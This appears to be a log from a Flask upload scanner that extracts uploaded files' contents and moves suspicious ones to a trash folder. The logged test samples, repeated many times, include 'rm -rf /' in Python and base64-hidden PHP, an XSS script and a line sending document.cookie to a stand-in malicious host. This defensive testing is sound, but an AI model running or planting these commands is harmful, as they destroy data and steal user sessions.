mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:04:38,738 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:04:38,742 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:04:38,745 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:04:38,746 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:04:38,746 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:04:38,746 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:04:38,746 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:04:38,746 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:04:38,746 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:04:38,746 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:04:38,746 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:04:38,750 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:04:38,754 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:04:38,754 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:04:38,754 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:04:38,754 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:04:38,754 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:04:38,754 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:04:38,754 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:04:38,754 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:04:38,754 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:04:38,758 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:04:38,762 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:04:38,762 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:04:38,765 - 127.0.0.1 - - [22/Feb/2025 20:04:38] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-22 20:04:38,767 - 127.0.0.1 - - [22/Feb/2025 20:04:38] "GET / HTTP/1.1" 200 -
2025-02-22 20:04:48,466 - 127.0.0.1 - - [22/Feb/2025 20:04:48] "GET / HTTP/1.1" 200 -
2025-02-22 20:07:02,683 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:08:36,417 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:13:24,794 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:13:24,796 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:13:24,797 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:13:24,799 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:13:24,800 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:13:24,801 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:13:24,807 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:13:24,814 - Embedded object detected in uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx
2025-02-22 20:13:24,815 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:13:24,816 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:13:24,818 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:13:24,819 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:13:24,820 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:13:24,822 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:13:24,823 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:13:24,829 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:13:24,836 - Embedded object detected in uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx
2025-02-22 20:13:24,836 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:13:24,838 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:13:24,839 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:13:24,840 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:13:24,841 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:13:24,842 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:13:24,843 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:13:24,848 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:13:24,856 - Embedded object detected in uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx
2025-02-22 20:13:24,856 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:13:24,858 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:13:24,859 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:13:24,860 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:13:24,861 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:13:24,863 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:13:24,864 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:13:24,870 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:13:24,877 - Embedded object detected in uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx
2025-02-22 20:13:24,877 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:13:24,878 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:13:24,880 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:13:24,881 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:13:24,882 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:13:24,883 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:13:24,884 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:13:24,890 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:13:24,897 - Embedded object detected in uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx
2025-02-22 20:13:24,897 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:13:24,898 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:13:24,899 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:13:24,901 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:13:24,902 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:13:24,903 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:13:24,904 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:13:24,910 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:13:24,917 - Embedded object detected in uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx
2025-02-22 20:13:24,917 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:13:24,918 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:13:24,919 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:13:24,920 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:13:24,922 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:13:24,923 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:13:24,924 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:13:24,925 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:13:24,930 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:13:24,937 - Embedded object detected in uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:13:24,937 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:13:24,938 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:13:24,939 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:13:24,941 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:13:24,942 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:13:24,943 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:13:24,944 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:13:24,945 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:13:24,946 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:13:24,947 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:13:24,955 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:13:24,962 - Embedded object detected in uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:13:24,962 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:13:24,963 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:13:24,964 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:13:24,965 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:13:24,966 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:13:24,967 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:13:24,969 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:13:24,970 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:13:24,971 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:13:24,972 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:13:24,977 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:13:24,983 - Embedded object detected in uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:13:24,984 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:13:24,985 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
